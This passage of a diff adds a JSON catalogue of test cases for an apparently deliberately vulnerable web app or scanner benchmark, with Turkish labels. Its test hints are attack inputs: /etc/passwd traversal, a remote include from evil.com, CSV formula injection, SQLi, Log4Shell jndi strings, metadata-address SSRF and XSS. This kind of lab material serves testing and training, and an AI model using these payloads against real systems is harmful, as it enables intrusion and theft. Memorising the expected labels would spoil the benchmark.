+    "category": "A04-FileHandling",
+    "vuln_type": "Zip Slip (../../evil.sh mock)",
+    "expectation": "vulnerable",
+    "test_hint": "/files/unzip {\"filename\":\"../../evil.sh\"}",
+    "severity": "high"
+  },
+  {
+    "id": "FILE-LFI-01",
+    "method": "GET",
+    "path": "/files/view",
+    "category": "A04-FileHandling",
+    "vuln_type": "LFI (template= + php://filter mock)",
+    "expectation": "vulnerable",
+    "test_hint": "/files/view?template=../../etc/passwd",
+    "severity": "high"
+  },
+  {
+    "id": "FILE-LFI-01-SECURE",
+    "method": "GET",
+    "path": "/files/view-secure",
+    "category": "A04-FileHandling",
+    "vuln_type": "LFI allowlist control",
+    "expectation": "secure",
+    "test_hint": "/files/view-secure?template=../../etc/passwd -> 400",
+    "severity": "info"
+  },
+  {
+    "id": "FILE-RFI-01",
+    "method": "GET",
+    "path": "/files/page",
+    "category": "A04-FileHandling",
+    "vuln_type": "RFI (remote include mock, fetch yok)",
+    "expectation": "vulnerable",
+    "test_hint": "/files/page?url=https://evil.com/shell.txt",
+    "severity": "high"
+  },
+  {
+    "id": "FILE-CSV-01",
+    "method": "GET",
+    "path": "/files/export.csv",
+    "category": "A04-FileHandling",
+    "vuln_type": "CSV formula injection (=cmd|...)",
+    "expectation": "vulnerable",
+    "test_hint": "/files/export.csv?user==cmd|'/C calc'!A0",
+    "severity": "medium"
+  },
+  {
+    "id": "SHOP-PRICE-01",
+    "method": "POST",
+    "path": "/shop/cart",
+    "category": "A04-BusinessLogic",
+    "vuln_type": "Fiyat client'tan (price tampering)",
+    "expectation": "vulnerable",
+    "test_hint": "/shop/cart {\"item\":\"ayakkabi\",\"price\":1,\"qty\":1}",
+    "severity": "high"
+  },
+  {
+    "id": "SHOP-PRICE-01-SECURE",
+    "method": "POST",
+    "path": "/shop/cart-secure",
+    "category": "A04-BusinessLogic",
+    "vuln_type": "Server-side pricing control",
+    "expectation": "secure",
+    "test_hint": "/shop/cart-secure fiyat yoksayılır",
+    "severity": "info"
+  },
+  {
+    "id": "SHOP-QTY-01",
+    "method": "POST",
+    "path": "/shop/cart-qty",
+    "category": "A04-BusinessLogic",
+    "vuln_type": "Negatif adet (bedava/iade mock)",
+    "expectation": "vulnerable",
+    "test_hint": "/shop/cart-qty {\"item\":\"tshirt\",\"qty\":-5}",
+    "severity": "medium"
+  },
+  {
+    "id": "SHOP-RACE-01",
+    "method": "POST",
+    "path": "/shop/coupon-race",
+    "category": "A04-BusinessLogic",
+    "vuln_type": "Tek kupon sınırsız (race, kilit yok)",
+    "expectation": "vulnerable",
+    "test_hint": "/shop/coupon-race {\"code\":\"TEK10\"} x10",
+    "severity": "medium"
+  },
+  {
+    "id": "SHOP-ORDER-01",
+    "method": "GET",
+    "path": "/shop/order/:id",
+    "category": "A04-BusinessLogic",
+    "vuln_type": "Sıralı sipariş ID enumeration",
+    "expectation": "vulnerable",
+    "test_hint": "/shop/order/1002",
+    "severity": "medium"
+  },
+  {
+    "id": "SHOP-ORDER-01-SECURE",
+    "method": "GET",
+    "path": "/shop/order-secure/:id",
+    "category": "A04-BusinessLogic",
+    "vuln_type": "UUID + sahiplik control",
+    "expectation": "secure",
+    "test_hint": "/shop/order-secure-ids ile UUID al",
+    "severity": "info"
+  },
+  {
+    "id": "CACHE-HOST-01",
+    "method": "GET",
+    "path": "/cache/reset-link",
+    "category": "A05-CacheSmuggle",
+    "vuln_type": "Host zehirlenmesi (X-Forwarded-Host reset link)",
+    "expectation": "vulnerable",
+    "test_hint": "/cache/reset-link (Header X-Forwarded-Host: evil.com)",
+    "severity": "high"
+  },
+  {
+    "id": "CACHE-DECEPT-01",
+    "method": "GET",
+    "path": "/cache/account/:id",
+    "category": "A05-CacheSmuggle",
+    "vuln_type": "Cache deception: PII public cache (TCKN/IBAN)",
+    "expectation": "vulnerable",
+    "test_hint": "/cache/account/1.css",
+    "severity": "high"
+  },
+  {
+    "id": "CACHE-DECEPT-01-SECURE",
+    "method": "GET",
+    "path": "/cache/account-secure/:id",
+    "category": "A05-CacheSmuggle",
+    "vuln_type": "Cache deception secure (no-store)",
+    "expectation": "secure",
+    "test_hint": "/cache/account-secure/1",
+    "severity": "info"
+  },
+  {
+    "id": "HTTP-METHOD-01",
+    "method": "POST",
+    "path": "/http/method",
+    "category": "A05-CacheSmuggle",
+    "vuln_type": "Method override ile yetkisiz DELETE",
+    "expectation": "vulnerable",
+    "test_hint": "/http/method (Header X-HTTP-Method-Override: DELETE)",
+    "severity": "medium"
+  },
+  {
+    "id": "HTTP-SMUG-01",
+    "method": "POST",
+    "path": "/http/smuggle",
+    "category": "A05-CacheSmuggle",
+    "vuln_type": "CL.TE smuggle oracle (mock, desync yok)",
+    "expectation": "vulnerable",
+    "test_hint": "/http/smuggle (CL+TE birlikte)",
+    "severity": "medium"
+  },
+  {
+    "id": "FP-SDK-01",
+    "method": "GET",
+    "path": "/fp/sdk-example",
+    "category": "FP-Trap",
+    "vuln_type": "FP trap: dokümantasyon ÖRNEK anahtarı",
+    "expectation": "fp-trap",
+    "test_hint": "/fp/sdk-example",
+    "severity": "info"
+  },
+  {
+    "id": "FP-WAF-01",
+    "method": "GET",
+    "path": "/fp/waf-block",
+    "category": "FP-Trap",
+    "vuln_type": "FP trap: statik WAF bilgi metni",
+    "expectation": "fp-trap",
+    "test_hint": "/fp/waf-block",
+    "severity": "info"
+  },
+  {
+    "id": "FP-CSP-01",
+    "method": "GET",
+    "path": "/fp/csp-inline",
+    "category": "FP-Trap",
+    "vuln_type": "FP trap: nonce+CSP'li güvenli inline script",
+    "expectation": "fp-trap",
+    "test_hint": "/fp/csp-inline",
+    "severity": "info"
+  },
+  {
+    "id": "FP-APIDOCS-01",
+    "method": "GET",
+    "path": "/fp/api-docs",
+    "category": "FP-Trap",
+    "vuln_type": "FP trap: şemada geçen ama dönmeyen passwordHash",
+    "expectation": "fp-trap",
+    "test_hint": "/fp/api-docs (Header X-User-Id: 1)",
+    "severity": "info"
+  },
+  {
+    "id": "FP-COUPON-01",
+    "method": "POST",
+    "path": "/fp/coupon-once",
+    "category": "FP-Trap",
+    "vuln_type": "FP trap: doğru tek-kullanım (410)",
+    "expectation": "fp-trap",
+    "test_hint": "/fp/coupon-once {\"code\":\"ONCE10\"} x2",
+    "severity": "info"
+  },
+  {
+    "id": "FP-LOCK-01",
+    "method": "POST",
+    "path": "/fp/login-lock",
+    "category": "FP-Trap",
+    "vuln_type": "FP trap: doğru kilit davranışı",
+    "expectation": "fp-trap",
+    "test_hint": "/fp/login-lock",
+    "severity": "info"
+  },
+  {
+    "id": "RT-TIME-01",
+    "method": "GET",
+    "path": "/runtime/sqli-time",
+    "category": "A03-Injection",
+    "vuln_type": "Time-based SQLi (gerçek 3sn gecikme)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/sqli-time?id=1 AND SLEEP(3)",
+    "severity": "high"
+  },
+  {
+    "id": "RT-BOOL-01",
+    "method": "GET",
+    "path": "/runtime/sqli-bool",
+    "category": "A03-Injection",
+    "vuln_type": "Boolean-based SQLi (içerik farkı)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/sqli-bool?id=1 AND 1=1 vs AND 1=2",
+    "severity": "high"
+  },
+  {
+    "id": "RT-HDRSQLI-01",
+    "method": "GET",
+    "path": "/runtime/search-ua",
+    "category": "A03-Injection",
+    "vuln_type": "Header-based SQLi (User-Agent)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/search-ua (Header User-Agent: ' OR '1'='1)",
+    "severity": "medium"
+  },
+  {
+    "id": "RT-ORDERBY-01",
+    "method": "GET",
+    "path": "/runtime/list",
+    "category": "A03-Injection",
+    "vuln_type": "ORDER BY enjeksiyonu",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/list?sort=(SELECT SLEEP(3))",
+    "severity": "high"
+  },
+  {
+    "id": "RT-HPP-01",
+    "method": "GET",
+    "path": "/runtime/hpp",
+    "category": "A01-AccessControl",
+    "vuln_type": "HTTP Parameter Pollution (sonuncu kazanır)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/hpp?id=1&id=99",
+    "severity": "medium"
+  },
+  {
+    "id": "RT-MAGIC-01",
+    "method": "POST",
+    "path": "/runtime/login-magic",
+    "category": "A07-Auth",
+    "vuln_type": "Magic hash loose-compare bypass",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/login-magic {username:admin, password:0e9999}",
+    "severity": "high"
+  },
+  {
+    "id": "RT-CACHEPOISON-01",
+    "method": "GET",
+    "path": "/runtime/search",
+    "category": "A05-CacheSmuggle",
+    "vuln_type": "Cache poisoning (yansımalı + public cache)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/search?q=<script>alert(1)</script>",
+    "severity": "high"
+  },
+  {
+    "id": "RT-CACHEPOISON-01-SECURE",
+    "method": "GET",
+    "path": "/runtime/search-secure",
+    "category": "A05-CacheSmuggle",
+    "vuln_type": "Cache poisoning secure (no-store)",
+    "expectation": "secure",
+    "test_hint": "/runtime/search-secure?q=<script>alert(1)</script>",
+    "severity": "info"
+  },
+  {
+    "id": "RT-MAILHDR-01",
+    "method": "POST",
+    "path": "/runtime/contact",
+    "category": "A03-Injection",
+    "vuln_type": "E-posta header enjeksiyonu (Bcc)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/contact {email: a@b.c%0d%0aBcc: x@evil.com}",
+    "severity": "medium"
+  },
+  {
+    "id": "RT-LOGPOISON-01",
+    "method": "GET",
+    "path": "/runtime/log-viewer",
+    "category": "A03-XSS",
+    "vuln_type": "Log poisoning stored XSS (escape yok)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/log-viewer (önce UA ile <script> gönder)",
+    "severity": "high"
+  },
+  {
+    "id": "RT-RESETLEAK-01",
+    "method": "GET",
+    "path": "/runtime/reset-page",
+    "category": "A02-Crypto",
+    "vuln_type": "Reset token URL'de + 3rd-party (Referer sızıntısı)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/reset-page?token=ABC123",
+    "severity": "medium"
+  },
+  {
+    "id": "RT-SIDURL-01",
+    "method": "GET",
+    "path": "/runtime/session-url",
+    "category": "A07-Auth",
+    "vuln_type": "Oturum ID'si URL'de",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/session-url?sid=sess-9f3a2b",
+    "severity": "medium"
+  },
+  {
+    "id": "RT-COOKIE-01",
+    "method": "GET",
+    "path": "/runtime/cookie-set",
+    "category": "A07-Auth",
+    "vuln_type": "Cookie bayraksız (HttpOnly/Secure yok)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/cookie-set",
+    "severity": "low"
+  },
+  {
+    "id": "RT-COOKIE-01-SECURE",
+    "method": "GET",
+    "path": "/runtime/cookie-set-secure",
+    "category": "A07-Auth",
+    "vuln_type": "Cookie secure control",
+    "expectation": "secure",
+    "test_hint": "/runtime/cookie-set-secure",
+    "severity": "info"
+  },
+  {
+    "id": "RT-BFLA-01",
+    "method": "POST",
+    "path": "/runtime/admin-export",
+    "category": "API-Security",
+    "vuln_type": "BFLA: normal kullanıcı admin export çalıştırır",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/admin-export (Header X-Role: user)",
+    "severity": "high"
+  },
+  {
+    "id": "RT-HEADBOLA-01",
+    "method": "GET",
+    "path": "/runtime/profile-mine",
+    "category": "API-Security",
+    "vuln_type": "Header-spoof BOLA (X-User-Id'e güven)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/profile-mine (Header X-User-Id: 99)",
+    "severity": "high"
+  },
+  {
+    "id": "RT-JWK-01",
+    "method": "GET",
+    "path": "/runtime/jwt-jwk",
+    "category": "A07-Auth",
+    "vuln_type": "JWT gömülü jwk'ya güven (saldırgan anahtarı)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/jwt-jwk?token=<jwk headerlı>",
+    "severity": "high"
+  },
+  {
+    "id": "RT-NOEXP-ISSUE",
+    "method": "GET",
+    "path": "/runtime/jwt-issue-long",
+    "category": "A07-Auth",
+    "vuln_type": "Süresiz JWT üretimi (exp yok)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/jwt-issue-long",
+    "severity": "low"
+  },
+  {
+    "id": "RT-NOEXP-01",
+    "method": "GET",
+    "path": "/runtime/jwt-verify",
+    "category": "A07-Auth",
+    "vuln_type": "JWT expiration yok sayılıyor",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/jwt-verify?token=<süresiz/dolmuş>",
+    "severity": "medium"
+  },
+  {
+    "id": "RT-LOG4J-01",
+    "method": "POST",
+    "path": "/runtime/log",
+    "category": "A03-Injection",
+    "vuln_type": "Log4Shell kalıbı (mock lookup, outbound yok)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/log {msg:${jndi:ldap://x/a}}",
+    "severity": "high"
+  },
+  {
+    "id": "RT-BLINDXSS-01",
+    "method": "POST",
+    "path": "/runtime/feedback",
+    "category": "A03-XSS",
+    "vuln_type": "Blind XSS giriş (callback depolanır)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/feedback {callback:/oob/t123}",
+    "severity": "high"
+  },
+  {
+    "id": "RT-BLINDXSS-02",
+    "method": "GET",
+    "path": "/runtime/feedback-view",
+    "category": "A03-XSS",
+    "vuln_type": "Blind XSS tetik (admin view script src)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/feedback-view",
+    "severity": "high"
+  },
+  {
+    "id": "RT-PHPINFO-01",
+    "method": "GET",
+    "path": "/runtime/phpinfo",
+    "category": "A05-Exposure",
+    "vuln_type": "phpinfo ifşası",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/phpinfo",
+    "severity": "low"
+  },
+  {
+    "id": "RT-PKG-01",
+    "method": "GET",
+    "path": "/runtime/package.json",
+    "category": "A05-Exposure",
+    "vuln_type": "package.json sürüm ifşası",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/package.json",
+    "severity": "low"
+  },
+  {
+    "id": "RT-COMPOSER-01",
+    "method": "GET",
+    "path": "/runtime/composer.json",
+    "category": "A05-Exposure",
+    "vuln_type": "composer.json sürüm ifşası",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/composer.json",
+    "severity": "low"
+  },
+  {
+    "id": "RT-REDIRBYPASS-01",
+    "method": "GET",
+    "path": "/runtime/go",
+    "category": "A01-AccessControl",
+    "vuln_type": "Open redirect bypass (//, backslash, js:)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/go?next=//evil.com",
+    "severity": "medium"
+  },
+  {
+    "id": "RT-UPLDBL-01",
+    "method": "POST",
+    "path": "/runtime/upload-img",
+    "category": "A04-FileHandling",
+    "vuln_type": "Çift uzantı + MIME spoof (shell.php.jpg)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/upload-img (X-Filename: shell.php.jpg)",
+    "severity": "high"
+  },
+  {
+    "id": "RT-UPLDBL-01-SECURE",
+    "method": "POST",
+    "path": "/runtime/upload-img-secure",
+    "category": "A04-FileHandling",
+    "vuln_type": "Upload uzantı control (tek ext + magic-byte)",
+    "expectation": "secure",
+    "test_hint": "/runtime/upload-img-secure (X-Filename: shell.php.jpg -> 400)",
+    "severity": "info"
+  },
+  {
+    "id": "RT-CTX-ATTR-01",
+    "method": "GET",
+    "path": "/runtime/attr",
+    "category": "Client-Side",
+    "vuln_type": "Attribute-context XSS (src çıkışı)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/attr?img=x onerror=alert(1)",
+    "severity": "medium"
+  },
+  {
+    "id": "RT-CTX-JS-01",
+    "method": "GET",
+    "path": "/runtime/jsvar",
+    "category": "Client-Side",
+    "vuln_type": "JS-string-context XSS",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/jsvar?data=';alert(1);//",
+    "severity": "medium"
+  },
+  {
+    "id": "RT-CTX-SECURE",
+    "method": "GET",
+    "path": "/runtime/attr-secure",
+    "category": "Client-Side",
+    "vuln_type": "Context allowlist control",
+    "expectation": "secure",
+    "test_hint": "/runtime/attr-secure?img=x onerror=alert(1) -> 400",
+    "severity": "info"
+  },
+  {
+    "id": "FP-SLOW-01",
+    "method": "GET",
+    "path": "/fp/slow-report",
+    "category": "FP-Trap",
+    "vuln_type": "FP trap: meşru yavaş sayfa (time-based FP)",
+    "expectation": "fp-trap",
+    "test_hint": "/fp/slow-report",
+    "severity": "info"
+  },
+  {
+    "id": "APP-AUTH-01",
+    "method": "POST",
+    "path": "/app/api/login",
+    "category": "APP-Shop",
+    "vuln_type": "Login soft-throttle var, kilit yok (kaba kuvvet)",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/login {username:alice, password:x} x N",
+    "severity": "medium"
+  },
+  {
+    "id": "APP-PROFILE",
+    "method": "GET",
+    "path": "/app/api/profile",
+    "category": "APP-Shop",
+    "vuln_type": "Profil okuma control (sahiplik var)",
+    "expectation": "secure",
+    "test_hint": "/app/api/profile (Bearer token)",
+    "severity": "info"
+  },
+  {
+    "id": "APP-MASS-01",
+    "method": "PUT",
+    "path": "/app/api/profile",
+    "category": "APP-Shop",
+    "vuln_type": "Mass-assignment role escalation (ZİNCİR)",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/profile {role:admin} -> admin_token",
+    "severity": "high"
+  },
+  {
+    "id": "APP-ADDR-01",
+    "method": "GET",
+    "path": "/app/api/address/:id",
+    "category": "APP-Shop",
+    "vuln_type": "Adres IDOR (auth var, sahiplik yok)",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/address/99 (Bearer alice)",
+    "severity": "high"
+  },
+  {
+    "id": "APP-TRACK-01",
+    "method": "GET",
+    "path": "/app/api/track/:id",
+    "category": "APP-Shop",
+    "vuln_type": "Sipariş takip enumeration (9001, 9002...)",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/track/9002 (Bearer alice)",
+    "severity": "medium"
+  },
+  {
+    "id": "APP-BASKET-01",
+    "method": "POST",
+    "path": "/app/api/basket",
+    "category": "APP-Shop",
+    "vuln_type": "Para birimi karışıklığı (USD=TRY)",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/basket {price:2499, currency:USD}",
+    "severity": "medium"
+  },
+  {
+    "id": "APP-CSRF-01",
+    "method": "GET",
+    "path": "/app/api/basket/add",
+    "category": "APP-Shop",
+    "vuln_type": "GET ile sepet değişir (CSRF-able)",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/basket/add?item=ayakkabi",
+    "severity": "medium"
+  },
+  {
+    "id": "APP-CSRF-TOKEN",
+    "method": "GET",
+    "path": "/app/api/csrf-token",
+    "category": "APP-Shop",
+    "vuln_type": "CSRF token dağıtımı control",
+    "expectation": "secure",
+    "test_hint": "/app/api/csrf-token (Bearer token)",
+    "severity": "info"
+  },
+  {
+    "id": "APP-CSRF-01-SECURE",
+    "method": "POST",
+    "path": "/app/api/basket/add",
+    "category": "APP-Shop",
+    "vuln_type": "CSRF token zorunlu control",
+    "expectation": "secure",
+    "test_hint": "/app/api/basket/add POST + X-CSRF",
+    "severity": "info"
+  },
+  {
+    "id": "APP-COUPON-01",
+    "method": "POST",
+    "path": "/app/api/checkout",
+    "category": "APP-Shop",
+    "vuln_type": "Kupon istifleme (sınırsız, hepsi uygulanır)",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/checkout {codes:[A,B,C,D,E,F]}",
+    "severity": "high"
+  },
+  {
+    "id": "APP-WALLET-01",
+    "method": "POST",
+    "path": "/app/api/wallet/topup",
+    "category": "APP-Shop",
+    "vuln_type": "Negatif yükleme bakiyeyi artırır",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/wallet/topup {amount:-1000}",
+    "severity": "high"
+  },
+  {
+    "id": "APP-REFUND-01",
+    "method": "POST",
+    "path": "/app/api/refund",
+    "category": "APP-Shop",
+    "vuln_type": "Aynı sipariş sınırsız iade",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/refund {orderId:9001} x N",
+    "severity": "medium"
+  },
+  {
+    "id": "APP-RESET-01",
+    "method": "POST",
+    "path": "/app/api/reset",
+    "category": "APP-Shop",
+    "vuln_type": "Güvenlik sorusu cevap profilde (admin dahil)",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/reset {username:admin, answer:Pamuk}",
+    "severity": "high"
+  },
+  {
+    "id": "APP-BFLA-01",
+    "method": "GET",
+    "path": "/app/api/internal/config",
+    "category": "APP-Shop",
+    "vuln_type": "BFLA: internal config (rol kontrolsüz)",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/internal/config (Bearer user)",
+    "severity": "medium"
+  },
+  {
+    "id": "APP-DEBUG-01",
+    "method": "GET",
+    "path": "/app/api/debug",
+    "category": "APP-Shop",
+    "vuln_type": "Debug kapısı (X-Debug header)",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/debug (Header X-Debug: 1)",
+    "severity": "medium"
+  },
+  {
+    "id": "APP-AVATAR-01",
+    "method": "GET",
+    "path": "/app/api/avatar",
+    "category": "APP-Shop",
+    "vuln_type": "Auth-gated SSRF (avatar proxy)",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/avatar?url=http://169.254.169.254/ (Bearer)",
+    "severity": "high"
+  },
+  {
+    "id": "APP-ENUM-01",
+    "method": "GET",
+    "path": "/app/api/users",
+    "category": "APP-Shop",
+    "vuln_type": "Kullanıcı listesi (auth var, yetki yok)",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/users (Bearer user)",
+    "severity": "medium"
+  },
+  {
+    "id": "APP-FEED-01",
+    "method": "POST",
+    "path": "/app/api/feedback",
+    "category": "APP-Shop",
+    "vuln_type": "Stored XSS (captcha anahtarı bundle'da)",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/feedback {message:<script>} (X-Captcha: test123-captcha-bypass)",
+    "severity": "high"
+  },
+  {
+    "id": "APP-FEEDVIEW-01",
+    "method": "GET",
+    "path": "/app/api/feedback-view",
+    "category": "APP-Shop",
+    "vuln_type": "Stored XSS tetik (escalation zinciri gerekir)",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/feedback-view (Bearer admin)",
+    "severity": "high"
+  },
+  {
+    "id": "APP-TOKEN-01",
+    "method": "GET",
+    "path": "/app/share",
+    "category": "APP-Shop",
+    "vuln_type": "JWT URL'de (sepet paylaşım linki)",
+    "expectation": "vulnerable",
+    "test_hint": "/app/share (Bearer token)",
+    "severity": "low"
+  },
+  {
+    "id": "APP-RECOVERY-01",
+    "method": "GET",
+    "path": "/app/api/recovery",
+    "category": "APP-Shop",
+    "vuln_type": "Sıralı kurtarma kodları (REC-1001...)",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/recovery?user=admin",
+    "severity": "medium"
+  },
+  {
+    "id": "CH-UNION-01",
+    "method": "GET",
+    "path": "/injection/union",
+    "category": "A03-Injection",
+    "vuln_type": "UNION-based SQLi (sütun sayacı oracle)",
+    "expectation": "vulnerable",
+    "test_hint": "/injection/union?id=1 ORDER BY 5 -> UNION SELECT 1,2,3",
+    "severity": "high"
+  },
+  {
+    "id": "CH-STACK-01",
+    "method": "GET",
+    "path": "/injection/stacked",
+    "category": "A03-Injection",
+    "vuln_type": "Stacked queries (; ikinci sorgu)",
+    "expectation": "vulnerable",
+    "test_hint": "/injection/stacked?id=1;SELECT @@version",
+    "severity": "high"
+  },
+  {
+    "id": "CH-2ND-01",
+    "method": "POST",
+    "path": "/runtime/register2",
+    "category": "A03-Injection",
+    "vuln_type": "Second-order SQLi giriş (ham saklanır)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/register2 {username:admin' OR '1'='1}",
+    "severity": "medium"
+  },
+  {
+    "id": "CH-2ND-02",
+    "method": "GET",
+    "path": "/runtime/admin-list",
+    "category": "A03-Injection",
+    "vuln_type": "Second-order SQLi tetik (admin liste)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/admin-list (kayıttan sonra)",
+    "severity": "high"
+  },
+  {
+    "id": "CH-SSTI-JINJA",
+    "method": "GET",
+    "path": "/ssti/jinja",
+    "category": "A03-Injection",
+    "vuln_type": "SSTI Jinja2 {{7*7}}",
+    "expectation": "vulnerable",
+    "test_hint": "/ssti/jinja?tpl={{7*7}}",
+    "severity": "high"
+  },
+  {
+    "id": "CH-SSTI-TWIG",
+    "method": "GET",
+    "path": "/ssti/twig",
+    "category": "A03-Injection",
+    "vuln_type": "SSTI Twig {{7*7}}",
+    "expectation": "vulnerable",
+    "test_hint": "/ssti/twig?tpl={{7*7}}",
+    "severity": "high"
+  },
+  {
+    "id": "CH-SSTI-FMT",
+    "method": "GET",
+    "path": "/ssti/freemarker",
+    "category": "A03-Injection",
+    "vuln_type": "SSTI Freemarker ${7*7}",
+    "expectation": "vulnerable",
+    "test_hint": "/ssti/freemarker?tpl=${7*7}",
+    "severity": "high"
+  },
+  {
+    "id": "CH-SSTI-ERB",
+    "method": "GET",
+    "path": "/ssti/erb",
+    "category": "A03-Injection",
+    "vuln_type": "SSTI ERB <%= 7*7 %>",
+    "expectation": "vulnerable",
+    "test_hint": "/ssti/erb?tpl=<%= 7*7 %>",
+    "severity": "high"
+  },
+  {
+    "id": "CH-SSTI-SEC",
+    "method": "GET",
+    "path": "/ssti/secure",
+    "category": "A03-Injection",
+    "vuln_type": "SSTI logic-less control",
+    "expectation": "secure",
+    "test_hint": "/ssti/secure?tpl={{7*7}}",
+    "severity": "info"
+  },
+  {
+    "id": "CH-LEGACY-01",
+    "method": "GET",
+    "path": "/legacy/:page",
+    "category": "A03-XSS",
+    "vuln_type": "Legacy 404 path yansıması",
+    "expectation": "vulnerable",
+    "test_hint": "/legacy/<script>alert(1)</script>",
+    "severity": "medium"
+  },
+  {
+    "id": "CH-ROLE-01",
+    "method": "GET",
+    "path": "/runtime/role-cookie",
+    "category": "A07-Auth",
+    "vuln_type": "İmzasız rol çerezi (base64 bit-flip)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/role-cookie (çerez role=admin yap)",
+    "severity": "medium"
+  },
+  {
+    "id": "CH-ROLE-01-SECURE",
+    "method": "GET",
+    "path": "/runtime/role-cookie-secure",
+    "category": "A07-Auth",
+    "vuln_type": "HMAC imzalı rol çerezi control",
+    "expectation": "secure",
+    "test_hint": "/runtime/role-cookie-secure",
+    "severity": "info"
+  },
+  {
+    "id": "CH-HTACCESS-01",
+    "method": "POST",
+    "path": "/runtime/upload-htaccess",
+    "category": "A04-FileHandling",
+    "vuln_type": ".htaccess overwrite upload",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/upload-htaccess (X-Filename: .htaccess)",
+    "severity": "high"
+  },
+  {
+    "id": "CH-VERB-01",
+    "method": "GET",
+    "path": "/runtime/verb-gate",
+    "category": "A01-AccessControl",
+    "vuln_type": "Verb confusion (GET ile silme)",
+    "expectation": "vulnerable",
+    "test_hint": "/runtime/verb-gate?action=delete",
+    "severity": "medium"
+  },
+  {
+    "id": "EDGE-SSRF-DEC",
+    "method": "GET",
+    "path": "/edge/dec",
+    "category": "A10-SSRF",
+    "vuln_type": "SSRF desimal IP bypass (2130706433)",
+    "expectation": "vulnerable",
+    "test_hint": "/edge/dec?url=http://2130706433/",
+    "severity": "high"
+  },
+  {
+    "id": "EDGE-SSRF-ZERO",
+    "method": "GET",
+    "path": "/edge/zero",
+    "category": "A10-SSRF",
+    "vuln_type": "SSRF 0.0.0.0 bypass",
+    "expectation": "vulnerable",
+    "test_hint": "/edge/zero?url=http://0.0.0.0/",
+    "severity": "high"
+  },
+  {
+    "id": "EDGE-SSRF-AT",
+    "method": "GET",
+    "path": "/edge/at",
+    "category": "A10-SSRF",
+    "vuln_type": "SSRF credential confusion (user@host)",
+    "expectation": "vulnerable",
+    "test_hint": "/edge/at?url=http://trusted.com@169.254.169.254/",
+    "severity": "high"
+  },
+  {
+    "id": "EDGE-SSRF-FRAG",
+    "method": "GET",
+    "path": "/edge/frag",
+    "category": "A10-SSRF",
+    "vuln_type": "SSRF fragment hilesi",
+    "expectation": "vulnerable",
+    "test_hint": "/edge/frag?url=http://evil.com#@trusted.com/",
+    "severity": "medium"
+  },
+  {
+    "id": "EDGE-SSRF-REDIR",
+    "method": "GET",
+    "path": "/edge/redir",
+    "category": "A10-SSRF",
+    "vuln_type": "SSRF redirect-zinciri takibi",
+    "expectation": "vulnerable",
+    "test_hint": "/edge/redir?url=https://short.example/abc",
+    "severity": "high"
+  },
+  {
+    "id": "EDGE-SSRF-SECURE",
+    "method": "GET",
+    "path": "/edge/fetch-secure",
+    "category": "A10-SSRF",
+    "vuln_type": "SSRF parser+allowlist control",
+    "expectation": "secure",
+    "test_hint": "/edge/fetch-secure?url=http://169.254.169.254/ -> 400",
+    "severity": "info"
+  },
+  {
+    "id": "EDGE-RET-01",
+    "method": "GET",
+    "path": "/edge/login-return",
+    "category": "A01-AccessControl",
+    "vuln_type": "Login returnUrl açık yönlendirme",
+    "expectation": "vulnerable",
+    "test_hint": "/edge/login-return?returnUrl=https://evil.com",
+    "severity": "medium"
+  },
+  {
+    "id": "EDGE-DOUBLE-01",
+    "method": "GET",
+    "path": "/edge/go2",
+    "category": "A01-AccessControl",
+    "vuln_type": "HPP redirect (son next kazanır)",
+    "expectation": "vulnerable",
+    "test_hint": "/edge/go2?next=/safe&next=https://evil.com",
+    "severity": "medium"
+  },
+  {
+    "id": "EDGE-ORIG-01",
+    "method": "GET",
+    "path": "/edge/panel",
+    "category": "A01-AccessControl",
+    "vuln_type": "X-Original-URL admin bypass",
+    "expectation": "vulnerable",
+    "test_hint": "/edge/panel (Header X-Original-URL: /admin)",
+    "severity": "medium"
+  },
+  {
+    "id": "EDGE-LOCAL-01",
+    "method": "GET",
+    "path": "/edge/internal",
+    "category": "A01-AccessControl",
+    "vuln_type": "Localhost kapısı XFF bypass",
+    "expectation": "vulnerable",
